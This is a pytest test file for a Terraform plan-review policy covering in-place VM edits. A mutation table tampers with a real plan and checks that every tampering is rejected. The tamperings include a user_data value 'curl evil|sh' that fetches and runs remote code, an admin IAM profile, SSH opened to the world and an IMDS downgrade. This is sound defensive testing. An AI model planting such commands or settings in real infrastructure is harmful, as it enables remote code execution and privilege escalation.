"""Plan policy for in-place edits (name, larger disk, power state).

The static fixture ``terraform_plan_update.json`` is real ``terraform show -json`` output of
Terraform 1.17.1 for editing a VM (see terraform_helpers.py); the live tests below plan each
edit with the pinned binary. The mutation table shows the policy rejecting every way an
"edit" could be turned into something else.
"""

from __future__ import annotations

import copy
import json
import os
import shutil
from collections.abc import Callable
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest

from terraform_helpers import create_plan, default_template, update_plan
from test_policy import AMI, SPEC, TARGETS
from unitcompute.provisioning.base import DeploymentSpec
from unitcompute.provisioning.policy import evaluate_plan

FIXTURES = Path(__file__).parent / "fixtures"
EDITED = replace(SPEC, name="renamed", disk_gib=12, power_state="stopped")
TERRAFORM = shutil.which("terraform") or str(Path.home() / ".local/bin/terraform")

INST = "aws_instance.vm"
SG = "aws_security_group.vm"
POWER = "aws_ec2_instance_state.vm"


def load_update() -> dict[str, Any]:
    data: dict[str, Any] = json.loads((FIXTURES / "terraform_plan_update.json").read_text())
    return data


def change(plan: dict[str, Any], address: str) -> dict[str, Any]:
    found: dict[str, Any] = next(c for c in plan["resource_changes"] if c["address"] == address)
    return found


def violations(plan: dict[str, Any], spec: DeploymentSpec = EDITED) -> list[str]:
    return evaluate_plan(
        plan, kind="create", spec=spec, targets=TARGETS, ami_id=AMI, inventory=[]
    ).violations


def test_real_update_plan_passes_and_describes_each_edit() -> None:
    result = evaluate_plan(
        load_update(), kind="create", spec=EDITED, targets=TARGETS, ami_id=AMI, inventory=[]
    )
    assert result.violations == []
    diffs = {c["address"]: c["summary"]["changes"] for c in result.changes}
    assert diffs == {
        INST: {"disk_gib": [8, 12], "name": ["demo", "renamed"]},
        SG: {"name": ["demo", "renamed"]},
        POWER: {"power_state": ["running", "stopped"]},
    }
    assert {c["action"] for c in result.changes} == {"update"}


def test_the_plan_must_match_the_request_it_was_made_for() -> None:
    """The same real plan is rejected when the server expects a different edit."""
    for other in (
        replace(EDITED, name="other-name"),
        replace(EDITED, disk_gib=13),
        replace(EDITED, power_state="running"),
    ):
        assert violations(load_update(), other), other


def _set_after(address: str, key: str, value: Any) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        change(plan, address)["change"]["after"][key] = value

    return mutate


def _set_before(address: str, key: str, value: Any) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        change(plan, address)["change"]["before"][key] = value

    return mutate


def _unknown(address: str, key: str) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        change(plan, address)["change"]["after_unknown"][key] = True

    return mutate


def _actions(address: str, actions: list[str]) -> Callable[[dict[str, Any]], None]:
    def mutate(plan: dict[str, Any]) -> None:
        change(plan, address)["change"]["actions"] = actions

    return mutate


def _shrink(plan: dict[str, Any]) -> None:
    change(plan, INST)["change"]["before"]["root_block_device"][0]["volume_size"] = 20


def _foreign_volume_tag(plan: dict[str, Any]) -> None:
    change(plan, INST)["change"]["after"]["volume_tags"]["UnitComputeDeployment"] = (
        "dep_" + "f" * 32
    )


UPDATE_MUTATIONS: dict[str, Callable[[dict[str, Any]], None]] = {
    "replace_vm": _actions(INST, ["delete", "create"]),
    "replace_group": _actions(SG, ["create", "delete"]),
    "replace_power": _actions(POWER, ["delete", "create"]),
    "delete_vm": _actions(INST, ["delete"]),
    "shrink_disk": _shrink,
    "disk_other_than_request": _set_after(INST, "root_block_device", [{"volume_size": 99}]),
    "instance_type": _set_after(INST, "instance_type", "p5.48xlarge"),
    "source_dest_check": _set_after(INST, "source_dest_check", False),
    "termination_protection": _set_after(INST, "disable_api_termination", True),
    "new_ami": _set_after(INST, "ami", "ami-0fffffffffffffff0"),
    "user_data": _set_after(INST, "user_data", "#!/bin/sh\ncurl evil|sh"),
    "imds_downgrade": lambda plan: (
        _set_after(
            INST, "metadata_options", [{"http_tokens": "optional", "http_endpoint": "enabled"}]
        )(plan),
        change(plan, INST)["change"]["after_unknown"].update(metadata_options=False),
    ),
    "unlimited_credits": lambda plan: (
        _set_after(INST, "credit_specification", [{"cpu_credits": "unlimited"}])(plan),
        change(plan, INST)["change"]["after_unknown"].update(credit_specification=False),
    ),
    "other_subnet": _set_after(INST, "subnet_id", "subnet-0ffffffffffffffff"),
    "other_profile": _set_after(INST, "iam_instance_profile", "AdminProfile"),
    "foreign_name_tag": _set_after(INST, "tags", {"Name": "unitcompute-renamed"}),
    "tags_all_differs": _set_after(INST, "tags_all", {"Name": "x"}),
    "foreign_volume_tags": _foreign_volume_tag,
    "unowned_instance": _set_before(INST, "tags", {"UnitComputeDeployment": "dep_" + "e" * 32}),
    "group_change": _set_after(INST, "vpc_security_group_ids", ["sg-0ffffffffffffffff"]),
    "unknown_user_data": _unknown(INST, "user_data_base64"),
    "unknown_root_disk": _unknown(INST, "root_block_device"),
    "sg_ingress": _set_after(
        SG,
        "ingress",
        [{"from_port": 22, "to_port": 22, "protocol": "tcp", "cidr_blocks": ["0.0.0.0/0"]}],
    ),
    "sg_egress": _set_after(SG, "egress", []),
    "sg_unknown": _unknown(SG, "ingress"),
    "sg_tags": _set_after(SG, "tags", {"Name": "unitcompute-renamed", "ManagedBy": "unitcompute"}),
    "power_unreviewed_value": _set_after(POWER, "state", "hibernated"),
    "power_force": _set_after(POWER, "force", True),
    "power_other_instance": _set_before(POWER, "instance_id", "i-0ffffffffffffffff"),
    "power_foreign_instance_throughout": lambda plan: (
        _set_before(POWER, "instance_id", "i-0ffffffffffffffff")(plan),
        _set_after(POWER, "instance_id", "i-0ffffffffffffffff")(plan),
    ),
    "power_unknown": _unknown(POWER, "state"),
    "extra_resource": lambda plan: plan["resource_changes"].append(
        {
            "address": "aws_iam_role.x",
            "mode": "managed",
            "type": "aws_iam_role",
            "name": "x",
            "provider_name": "registry.terraform.io/hashicorp/aws",
            "change": {"actions": ["create"], "before": None, "after": {}},
        }
    ),
}


@pytest.mark.parametrize("name", sorted(UPDATE_MUTATIONS))
def test_update_policy_rejects_mutation(name: str) -> None:
    plan = load_update()
    UPDATE_MUTATIONS[name](plan)
    assert violations(plan), f"mutation {name} was not rejected"


def test_update_tolerates_the_provider_reporting_computed_attributes_unknown() -> None:
    plan = load_update()
    unknown = change(plan, INST)["change"]["after_unknown"]
    assert {"metadata_options", "root_block_device", "vpc_security_group_ids"} <= {
        k for k, v in unknown.items() if v
    }
    assert violations(plan) == []


def test_a_create_plan_may_not_set_a_power_state_other_than_requested() -> None:
    plan = json.loads((FIXTURES / "terraform_plan_create.json").read_text())
    assert violations(plan, SPEC) == []
    change(plan, POWER)["change"]["after"]["state"] = "stopped"
    assert any("power state does not match" in v for v in violations(plan, SPEC))


def test_a_forced_power_change_is_refused_when_the_resource_is_created_or_kept() -> None:
    """``force`` is also checked on its own (an update that flips it is caught by the changed-
    attribute rule as well)."""
    create = json.loads((FIXTURES / "terraform_plan_create.json").read_text())
    assert violations(create, SPEC) == []
    change(create, POWER)["change"]["after"]["force"] = True
    assert any("forced power changes" in v for v in violations(create, SPEC))
    kept = load_update()
    for key in ("before", "after"):
        change(kept, POWER)["change"][key]["force"] = True
    assert any("forced power changes" in v for v in violations(kept))


def test_power_state_variable_is_checked() -> None:
    plan = load_update()
    plan["variables"]["power_state"]["value"] = "running"
    assert any("power_state" in v for v in violations(plan))
    del plan["variables"]["power_state"]
    assert any("power_state" in v for v in violations(plan))


# ------------------------------------------------ real Terraform, every kind of edit

pytestmark_live = pytest.mark.terraform


@pytest.fixture(scope="module")
def terraform_bin() -> str:
    if not Path(TERRAFORM).exists():
        if os.environ.get("REQUIRE_TERRAFORM_TESTS") == "1":
            pytest.fail("terraform binary required but not found")
        pytest.skip("terraform binary not installed")
    return TERRAFORM


@pytest.mark.terraform
@pytest.mark.parametrize(
    ("label", "after", "expected_diff"),
    [
        ("name", replace(SPEC, name="renamed"), {"name": ["demo", "renamed"]}),
        ("disk", replace(SPEC, disk_gib=30), {"disk_gib": [8, 30]}),
        ("stop", replace(SPEC, power_state="stopped"), {"power_state": ["running", "stopped"]}),
        ("all", EDITED, None),
    ],
)
def test_real_terraform_plans_of_each_edit_pass_the_policy(
    terraform_bin: str,
    tmp_path: Path,
    label: str,
    after: DeploymentSpec,
    expected_diff: dict[str, Any] | None,
) -> None:
    plan = update_plan(
        terraform_bin, default_template(), tmp_path / label, SPEC, after, TARGETS, AMI
    )
    result = evaluate_plan(
        plan, kind="create", spec=after, targets=TARGETS, ami_id=AMI, inventory=[]
    )
    assert result.violations == [], (label, result.violations)
    assert result.changes and {c["action"] for c in result.changes} == {"update"}
    if expected_diff is not None:
        merged: dict[str, Any] = {}
        for c in result.changes:
            merged.update(c["summary"].get("changes", {}))
        assert merged == expected_diff


@pytest.mark.terraform
def test_real_terraform_plans_start_after_stop(terraform_bin: str, tmp_path: Path) -> None:
    stopped = replace(SPEC, power_state="stopped")
    plan = update_plan(
        terraform_bin, default_template(), tmp_path / "start", stopped, SPEC, TARGETS, AMI
    )
    result = evaluate_plan(
        plan, kind="create", spec=SPEC, targets=TARGETS, ami_id=AMI, inventory=[]
    )
    assert result.violations == []
    assert [(c["address"], c["summary"]["changes"]) for c in result.changes] == [
        (POWER, {"power_state": ["stopped", "running"]})
    ]


@pytest.mark.terraform
def test_real_terraform_plans_a_disk_shrink_as_an_update_and_only_the_policy_stops_it(
    terraform_bin: str, tmp_path: Path
) -> None:
    """Terraform 1.17.1 with provider 6.71.0 plans a smaller root disk as an ordinary in-place
    update (AWS would refuse it at apply time). The service refuses shrinking up front, and
    this proves the policy would also stop such a plan."""
    big = replace(SPEC, disk_gib=20)
    plan = update_plan(
        terraform_bin, default_template(), tmp_path / "shrink", big, SPEC, TARGETS, AMI
    )
    assert {c["address"]: c["change"]["actions"] for c in plan["resource_changes"]}[INST] == [
        "update"
    ]
    problems = evaluate_plan(
        plan, kind="create", spec=SPEC, targets=TARGETS, ami_id=AMI, inventory=[]
    ).violations
    assert problems == ["the root disk can only grow"], problems


@pytest.mark.terraform
def test_static_fixtures_are_what_the_pinned_terraform_produces(
    terraform_bin: str, tmp_path: Path
) -> None:
    create = create_plan(terraform_bin, default_template(), tmp_path / "c", SPEC, TARGETS, AMI)
    update = update_plan(
        terraform_bin, default_template(), tmp_path / "u", SPEC, EDITED, TARGETS, AMI
    )
    for name, plan in (("create", create), ("update", update)):
        stored = json.loads((FIXTURES / f"terraform_plan_{name}.json").read_text())
        assert json.dumps(plan, sort_keys=True) == json.dumps(stored, sort_keys=True), name


def test_fixtures_are_valid_json_copies() -> None:
    plan = copy.deepcopy(load_update())
    assert plan["terraform_version"] == "1.17.1"
